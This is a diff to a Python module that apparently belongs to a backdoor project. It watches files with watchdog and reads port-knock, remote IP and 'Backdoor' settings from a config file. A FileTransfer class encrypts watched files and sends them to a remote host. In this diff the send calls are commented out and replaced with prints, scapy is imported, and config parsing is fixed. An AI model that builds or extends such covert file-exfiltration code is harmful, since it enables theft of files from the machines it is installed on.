@@ -1,7 +1,8 @@
 from watchdog.events import PatternMatchingEventHandler, DirModifiedEvent
 from watchdog.observers import Observer
 import encryption, helpers
-import Configparser
+import ConfigParser
+from scapy.all import *
 
 class MyEventHandler(PatternMatchingEventHandler):
     def __init__(self, patterns=None):
@@ -9,13 +10,15 @@ class MyEventHandler(PatternMatchingEventHandler):
         self.fileTransfer = FileTransfer()
 
     def on_created(self, event):
-        self.fileTransfer.sendFile(event.src_path)
+        print("Create a file")
+        #self.fileTransfer.sendFile(event.src_path)
 
     def on_modified(self, event):
         if type(event) == DirModifiedEvent:
             return
 
-        self.sendFile(event.src_path)
+        print("Modified a file")
+        #self.fileTransfer.sendFile(event.src_path)
 
 class FileMonitor(object):
     def __init__(self):
@@ -49,14 +52,14 @@ class FileMonitor(object):
 
 class FileTransfer(object):
     def __init__(self):
-        config = Configparser.Configparser()
+        config = ConfigParser.ConfigParser()
         config.read('setup.config')
 
         self.knockList = config.get('General', 'knockList').split(',')
-        self.filePort = config.get('General', 'filePort')
+        self.filePort = int(config.get('General', 'filePort'))
         self.remoteIP = config.get('Backdoor', 'remoteIP')
         self.localIP = config.get('Backdoor', 'localIP')
-        self.localPort = config.get('Backdoor', 'localPort')
+        self.localPort = int(config.get('Backdoor', 'localPort'))
 
     def sendFile(self, filename):
         encryptedString = encryption.encryptFile(filename)
